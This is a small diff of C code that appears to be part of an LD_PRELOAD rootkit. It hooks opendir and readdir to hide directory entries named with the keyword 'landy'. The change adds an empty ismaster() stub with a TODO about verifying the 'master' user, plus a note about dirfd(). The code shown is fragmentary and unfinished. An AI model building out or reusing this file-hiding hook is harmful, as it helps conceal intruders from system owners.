@@ -14,6 +14,10 @@
 
 #define keyword "landy"
 
+int ismaster(){
+    //TODO find a good way to verify that master is master
+}
+
 //delcare the old functions :)
 DIR *(*old_opendir)(const char *name);
 struct dirent *(*old_readdir)(DIR *dirp);
@@ -42,6 +46,8 @@ struct dirent *readdir(DIR *dirp){
 	old_readdir = dlsym(RTLD_NEXT,"readdir");
     }
     
+    //TODO look into dirfd()
+
     //dir = old_readdir(dirp);
     //printf("%s",dir->d_name);
     //if(strstr(dir->d_name,keyword)){
